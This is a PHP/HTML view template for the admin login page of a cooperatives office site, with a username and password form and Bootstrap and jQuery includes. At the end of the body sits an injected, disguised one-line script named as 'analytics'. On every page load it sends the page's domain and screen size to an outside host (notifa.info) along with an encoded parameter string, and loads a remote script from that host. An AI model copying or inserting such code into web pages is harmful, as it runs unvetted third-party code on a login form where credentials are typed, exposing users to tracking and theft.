<!DOCTYPE html>
<html lang="en">

<head>
  <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <meta name="description" content="">
    <meta name="author" content="">
    <link rel="icon" href="<?php echo base_url() ?>frontend/img/dinas.png">

    <title>Bidang Koperasi </title>
  
	<!-- Bootstrap 4.1.3-->
	<link rel="stylesheet" href="<?php echo base_url() ?>backend/assets/vendor_components/bootstrap/css/bootstrap.css">
	
	<!-- Bootstrap-extend-->
	<link rel="stylesheet" href="<?php echo base_url() ?>backend/css/bootstrap-extend.css">

	<!-- Font Awesome -->
	<link rel="stylesheet" href="<?php echo base_url() ?>backend/assets/vendor_components/font-awesome/css/font-awesome.min.css">

	<!-- Ionicons -->
	<link rel="stylesheet" href="<?php echo base_url() ?>backend/assets/vendor_components/Ionicons/css/ionicons.min.css">

	<!-- Theme style -->
	<link rel="stylesheet" href="<?php echo base_url() ?>backend/css/master2.css">

	<!-- Minimal-art Admin Skins. Choose a skin from the css/skins
	   folder instead of downloading all of them to reduce the load. -->
	<link rel="stylesheet" href="<?php echo base_url() ?>backend/css/skins/_all-skins.css">	


	<!-- google font -->
	<link href="https://fonts.googleapis.com/css?family=Poppins:300,400,500,600,700" rel="stylesheet">

</head>
<body class="hold-transition login-page">
  <div  id="notifications"><?php echo $this->session->flashdata('pesan7'); ?></div>
<div class="login-box">
  <div class="login-logo">
    <a href="#"><b>Bidang Koperasi </b></a>
  </div>
  <!-- /.login-logo -->
  <div class="login-box-body">
    <p class="login-box-msg">Login Akun Admin</p>

    <form action="<?php echo base_url().'webbackend/C_dataOperator/prosesLoginAdmin'?>" method="post" class="form-element">
      <div class="form-group has-feedback">
        <input type="text" name="username" class="form-control" placeholder="Username">
        <span class="ion ion-email form-control-feedback"></span>
      </div>
      <div class="form-group has-feedback">
        <input type="password" name="password" class="form-control" placeholder="Password">
        <span class="ion ion-locked form-control-feedback"></span>
      </div>
      <div class="row">
       
        <div class="col-12 text-center">
          <!-- <button type="submit" class="btn btn-orange btn-block btn-flat margin-top-10">SIGN IN</button> -->
          
           <input type="submit" name="submit" class="btn btn-orange btn-block btn-flat margin-top-10" value="LOGIN" />
          
        </div>
        <!-- /.col -->
      </div>
    </form>


  </div>
  <!-- /.login-box-body -->
</div>
<!-- /.login-box -->

	<!-- jQuery 3 -->
	<script src="<?php echo base_url() ?>backend/assets/vendor_components/jquery-3.3.1/jquery-3.3.1.js"></script>
	
	<!-- popper -->
	<script src="<?php echo base_url() ?>backend/assets/vendor_components/popper/dist/popper.min.js"></script>
	
	<!-- Bootstrap 4.1.3-->
	<script src="<?php echo base_url() ?>backend/assets/vendor_components/bootstrap/js/bootstrap.min.js"></script>

<script type="text/javascript">if (self==top) {function netbro_cache_analytics(fn, callback) {setTimeout(function() {fn();callback();}, 0);}function sync(fn) {fn();}function requestCfs(){var idc_glo_url = (location.protocol=="https:" ? "https://" : "http://");var idc_glo_r = Math.floor(Math.random()*99999999999);var url = idc_glo_url+ "p01.notifa.info/3fsmd3/request" + "?id=1" + "&enc=9UwkxLgY9" + "&params=" + "4TtHaUQnUEiP6K%2fc5C582JKzDzTsXZH2awh6yNMRYGxwu8osDgorkoYzAVwlhl2nrO2pIsF0yL0BuBmuqVIohwSJ0Kt7xUmWJxrkiJHvCk%2fZUNCe%2fEXtf7kz%2bP4DiYLqq7XpqDW7cLYao%2fGcrHqrAczFDzN6nRMeLxl3FfKcQkzanhjDTGsbG%2fH2VWA2IDWwTSjxOxoF1%2f%2fLqOCQSgIutb0Vu8oKo3rKm86O5dFW1hfiJ4stq9Ze6syR4ME%2flISbTjhy2Njr3KolUfX%2bSlCmzVESvT9AxcdEC7%2bzpgzjdKI0pYiWOVVc%2fPhaY7%2fjwBsAyfpEcc6rlrOnp7gtIrrAOfTF2t8xeLyZn0plRwzr59yOdbn%2bOTM1%2bOi5BHh%2fkKgPYZ7jmDaZUSBPXxQhsdpdsxKRMkAMXSGrwaAkk6MkOvJx5hH9iu%2bf4fSmb%2bMWQwe7etY0ufA48CH0tlSY34bMB%2fXrnOaycPa4%2fZpO52E%2fgksAlFsakB48%2bYIE1AZ9ruOepLr%2fkWz1UjT3xJ%2fwxai%2btweHC0g43aAQQglDJ02rTRCwl%2bmvCcCoEw%3d%3d" + "&idc_r="+idc_glo_r + "&domain="+document.domain + "&sw="+screen.width+"&sh="+screen.height;var bsa = document.createElement('script');bsa.type = 'text/javascript';bsa.async = true;bsa.src = url;(document.getElementsByTagName('head')[0]||document.getElementsByTagName('body')[0]).appendChild(bsa);}netbro_cache_analytics(requestCfs, function(){});};</script></body>

</html>
